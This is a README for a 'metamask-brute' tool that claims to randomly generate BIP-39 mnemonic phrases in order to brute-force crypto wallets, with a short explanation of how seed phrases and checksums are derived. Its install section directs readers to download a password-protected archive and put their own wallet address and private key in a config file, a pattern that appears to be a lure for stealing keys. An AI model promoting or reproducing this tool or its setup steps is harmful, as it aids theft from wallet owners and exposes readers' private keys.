# metamask-brute



## For educational purposes only
A program random generate (12, 18, 24) words metamask mnemonic phrase.


## Install
- [Download](https://) the repository release and extract files with password `X`.
- Edit the `address` and `private_key` fields in the `config.json` file.

## How it works
Let's take a bitcoin wallet as an example
The initial phrase is the most important element when creating a Bitcoin wallet. It is derived through a series of mathematical operations using the official Bitcoin dictionary known as the "BIP-39 WORDLIST" which consists of 2048 words. The process begins by generating a random entropy, typically ranging from 128 to 256 bits and represented as a string of binary digits.

To ensure consistency in mathematical operations, the entropy length is divided by 32 to determine the BASE for subsequent steps. The entropy is then hashed using the SHA-256 algorithm, resulting in a hexadecimal hash value.

The most important step in the process is the creation of the checksum. The first BASE bits from the hexadecimal hash are added to the original entropy, resulting in a new validated entropy, which we denote as VALID_ENTROPY.

VALID_ENTROPY is then divided into the required word segments, e.g., 12 words, and each binary block is converted to a decimal representation. These decimal values correspond to the positions of the words in the BIP-39 WORDLIST. By selecting words from the word list based on the decimal values, an initial phrase is formed.

 By performing the actions described above, we can get the following results

<div id="header" align="center">
  <img src="https://houseoffirst.com/images/misc/mm_twitch_yellow_matte.gif" width="100"/>
</div>

## Warning
Using such techniques to gain unauthorized access to someone else's wallet is not only against the law but also highly unethical. It violates the trust and privacy of individuals and can lead to severe consequences, including legal action and criminal charges.
